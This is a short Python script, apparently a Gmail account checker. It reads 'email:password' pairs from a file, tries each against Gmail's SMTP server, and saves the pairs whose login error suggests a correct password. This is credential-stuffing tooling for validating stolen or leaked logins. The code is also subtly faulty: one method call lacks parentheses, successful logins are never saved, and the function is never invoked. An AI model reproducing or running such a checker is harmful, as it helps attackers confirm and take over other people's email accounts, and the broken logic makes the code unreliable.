import smtplib
mails = open('tx', 'r').readlines()


def check_auth(mails):
    """
    validate gmail accounts
    :param mails: list of 'email@domain.com:password' couples
    """
    valid = []
    for e in mails:
        raw = e.split(':')
        login = raw[0].split('@')[0]
        passwd = raw[1]
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo
        try:
            smtpserver.login(login, passwd)
        except smtplib.SMTPAuthenticationError as e:
            if e.smtp_code != 535:
                valid.append('{}:{}'.format(login, passwd))
            pass

    f = open('test', 'w')
    f.write(str(valid))
    f.close()
